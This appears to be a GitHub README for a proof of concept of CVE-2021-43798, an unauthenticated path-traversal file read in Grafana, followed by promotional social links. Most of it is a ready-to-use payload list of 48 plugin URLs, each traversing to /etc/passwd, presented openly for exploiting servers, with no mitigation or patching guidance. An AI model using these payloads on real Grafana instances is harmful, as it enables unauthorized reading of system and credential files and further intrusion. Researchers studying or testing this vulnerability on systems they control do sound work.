# grafana-unauth-file-read : CVE-2021-43798

Unauthorized reading of files in Grafana (0day)

It looks like the new 0day LFI in Grafana exists thanks to the grafana-clock-panel plugin. It is enough to send a GET request of the form:

```GET /public/plugins/grafana-clock-panel/../../../../../../../etc/passwd```

# List of plugins

```/public/plugins/alertGroups/../../../../../../../../etc/passwd
/public/plugins/alertlist/../../../../../../../../etc/passwd
/public/plugins/alertmanager/../../../../../../../../etc/passwd
/public/plugins/annolist/../../../../../../../../etc/passwd
/public/plugins/barchart/../../../../../../../../etc/passwd
/public/plugins/bargauge/../../../../../../../../etc/passwd
/public/plugins/canvas/../../../../../../../../etc/passwd
/public/plugins/cloudwatch/../../../../../../../../etc/passwd
/public/plugins/dashboard/../../../../../../../../etc/passwd
/public/plugins/dashlist/../../../../../../../../etc/passwd
/public/plugins/debug/../../../../../../../../etc/passwd
/public/plugins/elasticsearch/../../../../../../../../etc/passwd
/public/plugins/gauge/../../../../../../../../etc/passwd
/public/plugins/geomap/../../../../../../../../etc/passwd
/public/plugins/gettingstarted/../../../../../../../../etc/passwd
/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd
/public/plugins/grafana/../../../../../../../../etc/passwd
/public/plugins/graph/../../../../../../../../etc/passwd
/public/plugins/graphite/../../../../../../../../etc/passwd
/public/plugins/heatmap/../../../../../../../../etc/passwd
/public/plugins/histogram/../../../../../../../../etc/passwd
/public/plugins/influxdb/../../../../../../../../etc/passwd
/public/plugins/jaeger/../../../../../../../../etc/passwd
/public/plugins/live/../../../../../../../../etc/passwd
/public/plugins/logs/../../../../../../../../etc/passwd
/public/plugins/loki/../../../../../../../../etc/passwd
/public/plugins/mixed/../../../../../../../../etc/passwd
/public/plugins/mssql/../../../../../../../../etc/passwd
/public/plugins/mysql/../../../../../../../../etc/passwd
/public/plugins/news/../../../../../../../../etc/passwd
/public/plugins/nodeGraph/../../../../../../../../etc/passwd
/public/plugins/opentsdb/../../../../../../../../etc/passwd
/public/plugins/piechart/../../../../../../../../etc/passwd
/public/plugins/pluginlist/../../../../../../../../etc/passwd
/public/plugins/postgres/../../../../../../../../etc/passwd
/public/plugins/prometheus/../../../../../../../../etc/passwd
/public/plugins/stat/../../../../../../../../etc/passwd
/public/plugins/state-timeline/../../../../../../../../etc/passwd
/public/plugins/status-history/../../../../../../../../etc/passwd
/public/plugins/table-old/../../../../../../../../etc/passwd
/public/plugins/table/../../../../../../../../etc/passwd
/public/plugins/tempo/../../../../../../../../etc/passwd
/public/plugins/testdata/../../../../../../../../etc/passwd
/public/plugins/text/../../../../../../../../etc/passwd
/public/plugins/timeseries/../../../../../../../../etc/passwd
/public/plugins/welcome/../../../../../../../../etc/passwd
/public/plugins/xychart/../../../../../../../../etc/passwd
/public/plugins/zipkin/../../../../../../../../etc/passwd
```

### Proof
![PoC](https://raw.githubusercontent.com/Vulnmachines/grafana-unauth-file-read/main/Grafana.PNG)

### Follow us
#### [Youtube](https://www.youtube.com/c/rapidsafeguard)
#### [Twitter](https://www.twiiter.com/rapidsafeguard)
#### [Telegram](https://t.me/rapidsafeguard)
#### [Vulnmachines.com](https://www.vulnmachines.com)
#### [Business query](https://www.rapidsafeguard.com)

### Let's connect
#### [LinkedIn](https://www.linkedin.com/in/punit-darji-5500/)
